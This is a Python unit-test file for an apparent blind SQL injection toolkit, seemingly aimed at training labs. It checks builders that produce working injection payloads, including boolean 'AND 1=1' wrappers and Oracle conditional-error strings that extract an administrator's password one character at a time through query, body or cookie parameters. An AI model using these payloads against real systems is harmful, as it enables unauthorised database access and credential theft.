"""Tests for SQL condition, payload, and injection-point components."""

import unittest

from models import RequestData
from payloads import (
    AsciiSubstringConditionBuilder,
    BodyParameterInjectionPoint,
    BooleanPayloadBuilder,
    ConditionalErrorPayloadBuilder,
    CookieInjectionPoint,
    OracleAsciiSubstringConditionBuilder,
    QueryParameterInjectionPoint,
)


class ConditionBuilderTests(unittest.TestCase):
    def setUp(self) -> None:
        self.builder = AsciiSubstringConditionBuilder()

    def test_builds_ascii_substring_condition(self) -> None:
        result = self.builder.build("database()", 3, ">=", 77)
        self.assertEqual(result, "ASCII(SUBSTRING(database(),3,1))>=77")

    def test_rejects_invalid_condition_parts(self) -> None:
        invalid_cases = (
            {"expression": "", "position": 1, "operator": "=", "value": 1},
            {"expression": "x", "position": 0, "operator": "=", "value": 1},
            {"expression": "x", "position": 1, "operator": "LIKE", "value": 1},
        )
        for kwargs in invalid_cases:
            with self.subTest(kwargs=kwargs), self.assertRaises(ValueError):
                self.builder.build(**kwargs)

        with self.assertRaises(TypeError):
            self.builder.build("x", 1, "=", True)

    def test_builds_oracle_substr_condition(self) -> None:
        result = OracleAsciiSubstringConditionBuilder().build("password", 3, "=", 53)
        self.assertEqual(result, "ASCII(SUBSTR(password,3,1))=53")


class PayloadBuilderTests(unittest.TestCase):
    def test_wraps_condition_with_default_boolean_syntax(self) -> None:
        builder = BooleanPayloadBuilder()
        self.assertEqual(builder.build("1=1"), "' AND (1=1)-- ")

    def test_supports_custom_delimiters(self) -> None:
        builder = BooleanPayloadBuilder(prefix="' OR ", suffix="-- ")
        self.assertEqual(builder.build("1=1"), "' OR 1=1-- ")

    def test_rejects_empty_parts(self) -> None:
        with self.assertRaises(ValueError):
            BooleanPayloadBuilder(prefix="")
        with self.assertRaises(ValueError):
            BooleanPayloadBuilder().build("   ")


class ConditionalErrorPayloadBuilderTests(unittest.TestCase):
    def test_wraps_condition_with_oracle_conditional_error_syntax(self) -> None:
        builder = ConditionalErrorPayloadBuilder()
        result = builder.build("ASCII(SUBSTR(password,1,1))<=104")
        self.assertEqual(
            result,
            "'||(SELECT CASE WHEN (ASCII(SUBSTR(password,1,1))<=104) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'--",
        )

    def test_builds_payload_for_laboratory_style_password_extraction(self) -> None:
        builder = ConditionalErrorPayloadBuilder()
        result = builder.build_for("password", 9, "<=", 52)
        self.assertEqual(
            result,
            "'||(SELECT CASE WHEN (ASCII(SUBSTR(password,9,1))<=52) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'--",
        )

    def test_rejects_empty_condition(self) -> None:
        with self.assertRaises(ValueError):
            ConditionalErrorPayloadBuilder().build("   ")

    def test_supports_configurable_oracle_row_context(self) -> None:
        builder = ConditionalErrorPayloadBuilder.for_oracle(
            table="users", user_column="username", username="administrator"
        )
        payload = builder.build("1=1")
        self.assertIn("FROM users WHERE username='administrator'", payload)


class InjectionPointTests(unittest.TestCase):
    def setUp(self) -> None:
        self.request = RequestData(
            "https://example.test/search",
            method="POST",
            headers={"X-Test": "yes"},
            cookies={"session": "abc"},
            query={"category": "books"},
            body={"search": "alice"},
        )

    def test_injects_query_parameter_without_mutating_original(self) -> None:
        result = QueryParameterInjectionPoint("category").inject(self.request, "'--")

        self.assertEqual(result.query["category"], "books'--")
        self.assertEqual(self.request.query["category"], "books")
        self.assertEqual(result.body, self.request.body)
        self.assertEqual(result.cookies, self.request.cookies)

    def test_injects_body_parameter_without_mutating_original(self) -> None:
        result = BodyParameterInjectionPoint("search").inject(self.request, " AND 1=1")

        self.assertEqual(result.body["search"], "alice AND 1=1")
        self.assertEqual(self.request.body["search"], "alice")

    def test_injects_cookie_without_mutating_original(self) -> None:
        result = CookieInjectionPoint("session").inject(self.request, "' AND 1=1--")

        self.assertEqual(result.cookies["session"], "abc' AND 1=1--")
        self.assertEqual(self.request.cookies["session"], "abc")

    def test_replaces_cookie_value_without_mutating_original(self) -> None:
        result = CookieInjectionPoint("session", "replace").inject(
            self.request, "payload"
        )

        self.assertEqual(result.cookies["session"], "payload")
        self.assertEqual(self.request.cookies["session"], "abc")

    def test_rejects_missing_parameter(self) -> None:
        points = (
            QueryParameterInjectionPoint("missing"),
            BodyParameterInjectionPoint("missing"),
            CookieInjectionPoint("missing"),
        )
        for point in points:
            with self.subTest(point=point), self.assertRaises(KeyError):
                point.inject(self.request, "payload")

    def test_rejects_empty_parameter(self) -> None:
        with self.assertRaises(ValueError):
            QueryParameterInjectionPoint("").inject(self.request, "payload")

    def test_rejects_invalid_injection_mode(self) -> None:
        with self.assertRaises(ValueError):
            CookieInjectionPoint("session", "prepend")


if __name__ == "__main__":
    unittest.main()
